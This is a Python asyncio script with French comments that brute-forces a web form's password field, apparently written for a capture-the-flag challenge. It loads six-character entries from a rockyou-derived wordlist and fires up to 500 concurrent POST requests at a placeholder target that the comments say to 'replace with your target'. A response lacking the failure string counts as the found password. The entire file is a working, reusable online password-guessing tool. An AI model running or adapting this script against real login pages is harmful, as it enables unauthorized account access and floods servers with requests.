import aiohttp
import asyncio
import time

# Configuration
url = "http://[2001:db8::1]/ctf/validation.php"  # Example IPv6 - Replace with your target
wordlist_path = "rockyou_6.txt"  # Wordlist filtrée avec 6 caractères
max_concurrent_requests = 500  # Nombre max de requêtes simultanées
timeout = 5  # Timeout réseau

attempts = 0  # Compteur global d'essais
lock = asyncio.Lock()  # Verrou pour synchronisation
semaphore = asyncio.Semaphore(max_concurrent_requests)  # Sémaphore pour limiter les requêtes

# Fonction pour tester un mot de passe (ASYNC)
async def test_password(session, word):
    global attempts
    data = {"word": word.strip()}

    async with semaphore:  # Limite les requêtes simultanées
        try:
            async with session.post(url, data=data, timeout=timeout) as response:
                text = await response.text()

                # Incrémentation atomique des tentatives
                async with lock:
                    attempts += 1

                # Vérifier si le mot de passe est correct
                if "Wrong word :(" not in text:
                    print(f"\nMot trouvé : {word}")
                    print(f"Trouvé après {attempts} tentatives !")
                    exit(0)
        except:
            pass  # Ignore les erreurs réseau

# Affichage en temps réel des statistiques
async def display_progress(total_words, start_time):
    global attempts
    while attempts < total_words:
        await asyncio.sleep(1)  # Mise à jour chaque seconde
        elapsed_time = time.time() - start_time
        req_per_sec = attempts / (elapsed_time + 1e-6)  # Évite division par zéro
        remaining_attempts = total_words - attempts
        estimated_time_left = remaining_attempts / (req_per_sec + 1e-6)

        print(f"[{attempts}/{total_words}] Tentatives | {req_per_sec:.2f} req/sec | Temps écoulé : {elapsed_time:.2f}s | Estimé restant : {estimated_time_left:.2f}s", flush=True)

# Gestion du bruteforce (ASYNC)
async def brute_force():
    global attempts
    start_time = time.time()  # Démarrage du bruteforce

    # Charger la wordlist
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
        words = [word.strip() for word in file if len(word.strip()) == 6]

    total_words = len(words)
    print(f"\nNombre total de mots de passe à tester : {total_words}\n")

    # Lancer le thread d'affichage en parallèle
    progress_task = asyncio.create_task(display_progress(total_words, start_time))

    # Création d'une session aiohttp
    connector = aiohttp.TCPConnector(limit_per_host=max_concurrent_requests)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [test_password(session, word) for word in words]

        # Exécuter les requêtes en mode "as_completed()" pour ne pas bloquer l'affichage
        for future in asyncio.as_completed(tasks):
            await future

    # Attendre la fin du thread de progression
    progress_task.cancel()

    # Fin du bruteforce
    total_time = time.time() - start_time
    print(f"\n Bruteforce terminé en {total_time:.2f} secondes !")

# Exécuter l'event loop asyncio
if __name__ == "__main__":
    asyncio.run(brute_force())